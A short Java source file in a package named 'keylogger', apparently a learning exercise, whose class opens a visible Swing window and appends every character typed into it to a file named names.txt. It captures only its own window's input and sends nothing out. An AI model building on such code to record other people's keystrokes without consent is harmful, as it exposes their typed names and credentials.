package keylogger;

import javax.swing.*;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.io.*;

public class Ris extends JFrame implements KeyListener {

    Ris() {
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setVisible(true);
        addKeyListener(this);
    }

    @Override
    public void keyTyped(KeyEvent e) {
        File file = new File("names.txt");
        try (OutputStreamWriter outputStream = new OutputStreamWriter(new FileOutputStream(file, true))) {
            outputStream.write(e.getKeyChar());
        } catch (Exception u) {
            u.printStackTrace();
        }
    }

    @Override
    public void keyPressed(KeyEvent e) {

    }

    @Override
    public void keyReleased(KeyEvent e) {

    }
}
